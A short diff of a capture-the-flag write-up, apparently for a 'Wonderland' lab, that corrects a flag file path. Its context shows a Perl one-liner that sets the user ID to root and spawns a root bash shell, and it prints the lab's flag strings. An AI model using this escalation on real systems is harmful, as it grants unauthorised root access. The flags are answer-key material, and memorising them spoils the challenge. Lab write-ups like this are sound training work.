@@ -121,7 +121,7 @@ Since that's us, let's try:
 >hatter@wonderland:~$ /usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'  
 root@wonderland:~#
 
-And we're home and done. The flags are in /root.user.txt and /home/alice/root.txt
+And we're home and done. The flags are in /root/user.txt and /home/alice/root.txt
 
 >home/alice/root.txt:thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}  
 root/user.txt:thm{"Curiouser and curiouser!"}
